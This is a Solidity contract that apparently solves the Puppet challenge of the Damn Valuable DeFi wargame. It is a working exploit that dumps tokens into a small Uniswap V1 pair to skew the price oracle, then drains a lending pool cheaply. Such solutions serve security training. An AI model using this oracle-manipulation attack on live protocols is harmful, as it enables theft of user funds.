// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Solve {
    constructor(
        address _tokenAddress,
        address _uniswapPairAddress,
        address _lendingPoolAddress,
        address _recovery,
        uint256 playerTokenAmount,
        uint256 poolTokenAmount
    ) payable {
        DamnValuableToken token = DamnValuableToken(_tokenAddress);
        token.transferFrom(msg.sender, address(this), playerTokenAmount);
        token.approve(_uniswapPairAddress, playerTokenAmount);
        IUniswapV1Exchange(_uniswapPairAddress).tokenToEthSwapInput(
            playerTokenAmount, 1 ether, block.timestamp + 1 days
        );
        PuppetPool(_lendingPoolAddress).borrow{value: msg.value}(poolTokenAmount, _recovery);
    }
}
